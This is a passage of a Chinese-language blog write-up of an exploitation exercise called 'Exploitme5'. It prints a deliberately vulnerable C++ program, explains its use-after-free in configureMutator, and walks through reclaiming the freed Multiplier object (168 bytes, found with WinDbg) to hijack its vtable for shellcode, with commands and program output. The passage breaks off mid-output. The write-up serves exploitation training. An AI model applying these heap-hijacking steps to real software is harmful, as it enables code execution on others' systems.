class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">bool</span> printAddresses = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mutator</span> &#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> param;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Mutator</span>(<span class="type">int</span> param) : <span class="built_in">param</span>(param) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">getParam</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> param;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mutate</span><span class="params">(<span class="type">void</span> *data, <span class="type">int</span> size)</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Multiplier</span> : <span class="keyword">public</span> Mutator &#123;</span><br><span class="line">	<span class="type">int</span> reserved[<span class="number">40</span>]; <span class="comment">// 现在没用到!</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Multiplier</span>(<span class="type">int</span> multiplier = <span class="number">0</span>) : <span class="built_in">Mutator</span>(multiplier) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mutate</span><span class="params">(<span class="type">void</span> *data, <span class="type">int</span> size)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="type">int</span> *ptr = (<span class="type">int</span> *)data;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size / <span class="number">4</span>; ++i)</span><br><span class="line">			ptr[i] *= <span class="built_in">getParam</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LowerCaser</span> : <span class="keyword">public</span> Mutator &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">LowerCaser</span>() : <span class="built_in">Mutator</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">mutate</span><span class="params">(<span class="type">void</span> *data, <span class="type">int</span> size)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="type">char</span> *ptr = (<span class="type">char</span> *)data;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">			<span class="keyword">if</span> (ptr[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ptr[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">				ptr[i] -= <span class="number">0x20</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span> &#123;</span><br><span class="line">	<span class="type">void</span> *data;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Block</span>(<span class="type">void</span> *data, <span class="type">int</span> size) : <span class="built_in">data</span>(data), <span class="built_in">size</span>(size) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> *<span class="title">getData</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> data; &#125;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> size; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">flush</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> ch;</span><br><span class="line">	<span class="keyword">while</span> ((ch = <span class="built_in">getchar</span>()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; ch != EOF);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量</span></span><br><span class="line">vector&lt;Block&gt; blocks;</span><br><span class="line">Mutator *mutators[] = &#123; <span class="keyword">new</span> <span class="built_in">Multiplier</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="built_in">LowerCaser</span>() &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">configureMutator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(</span><br><span class="line">			<span class="string">&quot;1) Multiplier (multiplier = %d)\n&quot;</span></span><br><span class="line">			<span class="string">&quot;2) LowerCaser\n&quot;</span></span><br><span class="line">			<span class="string">&quot;3) Exit\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\n&quot;</span></span><br><span class="line">			<span class="string">&quot;Your choice [1-3]: &quot;</span>, mutators[<span class="number">0</span>]-&gt;<span class="built_in">getParam</span>());</span><br><span class="line">		<span class="type">int</span> choice = _getch();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (choice == <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (choice &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; choice &lt;= <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (choice == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (printAddresses)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;mutators[0] = 0x%08x\n&quot;</span>, mutators[<span class="number">0</span>]);</span><br><span class="line">				<span class="keyword">delete</span> mutators[<span class="number">0</span>];</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;multiplier (int): &quot;</span>);</span><br><span class="line">				<span class="type">int</span> multiplier;</span><br><span class="line">				<span class="type">int</span> res = <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;multiplier);</span><br><span class="line">				<span class="comment">// fflush(stdin);</span></span><br><span class="line">				<span class="built_in">flush</span>();</span><br><span class="line">				<span class="keyword">if</span> (res) &#123;</span><br><span class="line">					mutators[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">Multiplier</span>(multiplier);</span><br><span class="line">					<span class="keyword">if</span> (printAddresses)</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;mutators[0] = 0x%08x\n&quot;</span>, mutators[<span class="number">0</span>]);</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;Multiplier was configured\n\n&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;LowerCaser is not configurable for now!\n\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Wrong choice!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">listBlocks</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;------- Blocks -------\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!printAddresses)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; blocks.<span class="built_in">size</span>(); ++i)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;block %d: size = %d\n&quot;</span>, i, blocks[i].<span class="built_in">getSize</span>());</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; blocks.<span class="built_in">size</span>(); ++i)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;block %d: address = 0x%08x; size = %d\n&quot;</span>, i, blocks[i].<span class="built_in">getData</span>(), blocks[i].<span class="built_in">getSize</span>());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;----------------------\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">readBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> *data;</span><br><span class="line">	<span class="type">char</span> filePath[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;File path (&#x27;exit&#x27; to exit): &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf_s</span>(<span class="string">&quot;%s&quot;</span>, filePath, <span class="built_in">sizeof</span>(filePath));</span><br><span class="line">		<span class="built_in">fflush</span>(stdin);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(filePath, <span class="string">&quot;exit&quot;</span>))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		FILE *f = <span class="built_in">fopen</span>(filePath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!f)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t open the file!\n\n&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">fseek</span>(f, <span class="number">0L</span>, SEEK_END);</span><br><span class="line">			<span class="type">long</span> bytes = <span class="built_in">ftell</span>(f);</span><br><span class="line">			data = <span class="keyword">new</span> <span class="type">char</span>[bytes];</span><br><span class="line">			<span class="built_in">fseek</span>(f, <span class="number">0L</span>, SEEK_SET);</span><br><span class="line">			<span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span> (pos &lt; bytes) &#123;</span><br><span class="line">				<span class="type">int</span> len = bytes - pos &gt; <span class="number">200</span> ? <span class="number">200</span> : bytes - pos;</span><br><span class="line">				<span class="built_in">fread</span>(data + pos, <span class="number">1</span>, len, f);</span><br><span class="line">				pos += len;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">fclose</span>(f);</span><br><span class="line">			blocks.<span class="built_in">push_back</span>(<span class="built_in">Block</span>(data, bytes));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Block read (%d bytes)\n\n&quot;</span>, bytes);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">duplicateBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">listBlocks</span>();</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Index of block to duplicate (-1 to exit): &quot;</span>);</span><br><span class="line">		<span class="type">int</span> index;</span><br><span class="line">		<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">		<span class="built_in">fflush</span>(stdin);</span><br><span class="line">		<span class="keyword">if</span> (index == <span class="number">-1</span>)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		<span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= (<span class="type">int</span>)blocks.<span class="built_in">size</span>()) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Wrong index!\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">				<span class="type">int</span> copies;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Number of copies (-1 to exit): &quot;</span>);</span><br><span class="line">				<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;copies);</span><br><span class="line">				<span class="built_in">fflush</span>(stdin);</span><br><span class="line">				<span class="keyword">if</span> (copies == <span class="number">-1</span>)</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				<span class="keyword">if</span> (copies &lt;= <span class="number">0</span>)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;Wrong number of copies!\n&quot;</span>);</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; copies; ++i) &#123;</span><br><span class="line">						<span class="type">int</span> size = blocks[index].<span class="built_in">getSize</span>();</span><br><span class="line">						<span class="type">void</span> *data = <span class="keyword">new</span> <span class="type">char</span>[size];</span><br><span class="line">						<span class="built_in">memcpy</span>(data, blocks[index].<span class="built_in">getData</span>(), size);</span><br><span class="line">						blocks.<span class="built_in">push_back</span>(<span class="built_in">Block</span>(data, size));</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myExit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutateBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">listBlocks</span>();</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Index of block to mutate (-1 to exit): &quot;</span>);</span><br><span class="line">		<span class="type">int</span> index;</span><br><span class="line">		<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">		<span class="built_in">fflush</span>(stdin);</span><br><span class="line">		<span class="keyword">if</span> (index == <span class="number">-1</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= (<span class="type">int</span>)blocks.<span class="built_in">size</span>()) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Wrong index!\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(</span><br><span class="line">					<span class="string">&quot;1) Multiplier\n&quot;</span></span><br><span class="line">					<span class="string">&quot;2) LowerCaser\n&quot;</span></span><br><span class="line">					<span class="string">&quot;3) Exit\n&quot;</span></span><br><span class="line">					<span class="string">&quot;Your choice [1-3]: &quot;</span>);</span><br><span class="line">				<span class="type">int</span> choice = _getch();</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span> (choice == <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">if</span> (choice &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; choice &lt;= <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">					choice -= <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">					mutators[choice - <span class="number">1</span>]-&gt;<span class="built_in">mutate</span>(blocks[index].<span class="built_in">getData</span>(), blocks[index].<span class="built_in">getSize</span>());</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;The block was mutated.\n\n&quot;</span>);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;Wrong choice!\n\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">handleMenu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(</span><br><span class="line">			<span class="string">&quot;1) Read block from file\n&quot;</span></span><br><span class="line">			<span class="string">&quot;2) List blocks\n&quot;</span></span><br><span class="line">			<span class="string">&quot;3) Duplicate Block\n&quot;</span></span><br><span class="line">			<span class="string">&quot;4) Configure mutator\n&quot;</span></span><br><span class="line">			<span class="string">&quot;5) Mutate block\n&quot;</span></span><br><span class="line">			<span class="string">&quot;6) Exit\n&quot;</span></span><br><span class="line">			<span class="string">&quot;\n&quot;</span></span><br><span class="line">			<span class="string">&quot;Your choice [1-6]: &quot;</span>);</span><br><span class="line">		<span class="type">int</span> choice = _getch();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (choice &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; choice &lt;= <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">			<span class="keyword">return</span> choice - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Wrong choice!\n\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*funcPtr)</span><span class="params">()</span></span>;</span><br><span class="line">	funcPtr functions[] = &#123; readBlock, listBlocks, duplicateBlock, configureMutator, mutateBlock, myExit &#125;;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="type">int</span> choice = <span class="built_in">handleMenu</span>();</span><br><span class="line">		functions[choice - <span class="number">1</span>]();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">bool</span> printAddresses = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mutator</span>; <span class="comment">// 每个mutator包含一个虚表指针(虚表中包含mutate()函数)，一个参数param。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Multiplier</span> : <span class="keyword">public</span> Mutator; <span class="comment">// 包含mutate函数，可修改block中的数据为元数据的指定倍数。</span></span><br><span class="line"><span class="comment">// 还包含40*4=160个字节的保留区域</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LowerCaser</span> : <span class="keyword">public</span> Mutator; <span class="comment">// 包含mutate函数，可将block中的小写字母，转换为大写</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>; <span class="comment">// 每个block包含一个数据指针void *data, 一个数据大小int size，共8个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量</span></span><br><span class="line">vector&lt;Block&gt; blocks; <span class="comment">// 存储块，</span></span><br><span class="line">Mutator *mutators[] = &#123; <span class="keyword">new</span> <span class="built_in">Multiplier</span>(<span class="number">2</span>), <span class="keyword">new</span> <span class="built_in">LowerCaser</span>() &#125;; <span class="comment">// 存储转换器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">configureMutator</span><span class="params">()</span> <span class="comment">// 配置转换器，由于Mutator类不支持直接对param进行修改，只能先删除之前mutators[0]中的对象，然后新创建一个</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">listBlocks</span><span class="params">()</span>	<span class="comment">// 列出所有的块信息</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">readBlock</span><span class="params">()</span>	<span class="comment">// 从文件中读取数据，创建一个block并将其加入列表</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">duplicateBlock</span><span class="params">()</span> <span class="comment">// 先列出所有块，指定块id和复制份数，然后根据要求进行复制</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutateBlock</span><span class="params">()</span> <span class="comment">// 先列出所有块，指定待变换的块id和转换方法，然后对该块内的数据进行转换</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">handleMenu</span><span class="params">()</span> <span class="comment">// 输出提示菜单，读取用户命令，并返回给main</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> <span class="comment">// main函数中，定义函数指针数组，调用handleMenu，根据返回序号，调用对应函数</span></span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="UAF漏洞分析"><a href="#UAF漏洞分析" class="headerlink" title="UAF漏洞分析"></a>UAF漏洞分析</h3><p>UAF漏洞存在于ConfigureMutator函数中</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (choice == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">delete</span> mutators[<span class="number">0</span>]; <span class="comment">// 输入为1，先释放原来对象，将那(两)块内存区域加入空闲列表</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="type">int</span> multiplier;</span><br><span class="line">    <span class="type">int</span> res = <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;multiplier); <span class="comment">// 读取参数</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (res) &#123;	<span class="comment">// 如果参数读取成功，从空闲列表中去除刚才释放的(两块)内存，创建新的对象，</span></span><br><span class="line">        mutators[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">Multiplier</span>(multiplier);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>; <span class="comment">// 如果参数读取失败，比如输入字符a(res=0)，会直接退出循环，然后退出函数。此时mutators[0]处的对象已被delete。</span></span><br><span class="line">    <span class="comment">// 但我们仍能够通过mutators[0]访问那块内存区域，即 Use After Free</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因此，如果我们在mutators[0]所指对象被回收后，创建包含和该对象相同大小data的block，即可劫持该对象，以及它的虚表和虚函数。</p>
-<p>当再次调用该对象的mutate()函数时，就会执行我们预先存储好的shellcode。</p>
-<h4 id="确定对象大小"><a href="#确定对象大小" class="headerlink" title="确定对象大小"></a>确定对象大小</h4><p>通过以下命令，可以看到一个Multiplier对象的大小是 168 个字节</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt Mutator</span><br><span class="line">Exploitme5!Mutator</span><br><span class="line">   +0x000 __VFN_table : Ptr32 </span><br><span class="line">   +0x004 param            : Int4B</span><br><span class="line">0:000&gt; dt Multiplier</span><br><span class="line">Exploitme5!Multiplier</span><br><span class="line">   +0x000 __VFN_table : Ptr32 </span><br><span class="line">   +0x004 param            : Int4B</span><br><span class="line">   +0x008 reserved         : [40] Int4B</span><br></pre></td></tr></table></figure>
-
-<h4 id="劫持对象"><a href="#劫持对象" class="headerlink" title="劫持对象"></a>劫持对象</h4><p>为了保证我们的数据成功占用被回收的对象所在的内存块，在对象被删除，与payload所在块被创建之间，尽量不要调用危险函数，比如fopen。因此，我们的劫持逻辑如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readBlock 读入数据，创建块 : <span class="number">1</span> D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat</span><br><span class="line"><span class="keyword">delete</span> mutators[<span class="number">0</span>] 删除对象 : <span class="number">4</span> <span class="number">1</span> a</span><br><span class="line">duplicateBlock 复制快，payload所在的新块占用被回收的对象空间 : <span class="number">3</span> <span class="number">0</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>执行以下python代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b&quot;a&quot;</span>*<span class="number">168</span>)</span><br></pre></td></tr></table></figure>
-
-<p>运行程序，得到（略去menu）：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Your choice [<span class="number">1</span><span class="number">-6</span>]:<span class="number">1</span>			<span class="comment">// 读入数据</span></span><br><span class="line"><span class="function">File <span class="title">path</span> <span class="params">(<span class="string">&#x27;exit&#x27;</span> to exit)</span>: D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat // 指定文件</span></span><br><span class="line"><span class="function">Block read (<span class="number">168</span> bytes)</span></span><br><span class="line"><span class="function">...</span></span><br><span class="line"><span class="function">Your choice [<span class="number">1</span><span class="number">-6</span>]:<span class="number">4</span>			// 配置mutator</span></span><br><span class="line"><span class="function"><span class="number">1</span>) Multiplier (multiplier =</span> <span class="number">2</span>)</span><br><span class="line"><span class="number">2</span>) LowerCaser</span><br><span class="line"><span class="number">3</span>) Exit</span><br><span class="line">Your choice [<span class="number">1</span><span class="number">-3</span>]:<span class="number">1</span>			<span class="comment">// 选定multiplier</span></span><br><span class="line">mutators[<span class="number">0</span>] = <span class="number">0x00d864a0</span>   <span class="comment">// 删除mutators[0]处的multiplier对象，地址为0x00d864a0</span></span><br><span class="line"><span class="built_in">multiplier</span> (<span class="type">int</span>): a			<span class="comment">// 输入a，使得res为0，阻止此时创建新对象</span></span><br><span class="line">...</span><br><span class="line">Your choice [<span class="number">1</span><span class="number">-6</span>]:<span class="number">3</span>			<span class="comment">// 复制对象</span></span><br><span class="line">------- Blocks -------</span><br><span class="line">block <span class="number">0</span>: address = <span class="number">0x00d8b138</span>; size = <span class="number">168</span></span><br><span class="line">----------------------</span><br><span class="line">Index of block to <span class="built_in">duplicate</span> (<span class="number">-1</span> to exit): <span class="number">0</span> <span class="comment">// 选择我们准备好的block</span></span><br><span class="line">Number of <span class="built_in">copies</span> (<span class="number">-1</span> to exit): <span class="number">1</span>	<span class="comment">// 1份</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Your choice [<span class="number">1</span><span class="number">-6</span>]:<span class="number">2</span>	<span class="comment">// 再次查看所有的块</span></span><br><span class="line">------- Blocks -------</span><br><span class="line">block <span class="number">0</span>: address = <span class="number">0x00d8b138</span>; size = <span 